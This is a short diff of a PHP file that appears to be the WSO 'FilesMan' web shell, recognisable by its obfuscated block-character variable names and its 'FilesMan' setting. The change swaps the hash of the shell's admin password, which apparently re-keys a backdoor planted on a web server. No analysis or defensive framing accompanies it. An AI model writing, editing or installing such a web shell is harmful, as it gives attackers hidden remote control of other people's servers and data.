@@ -6,7 +6,7 @@ if (!empty($_GET['status'])){
 	exit(0);
 }
 
-$▛ = "52169e54b7e7d2266e9548ed5b4c78cd"; //admin
+$▛ = "acf465ece4add730322d4c64cfee6513"; //admin
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
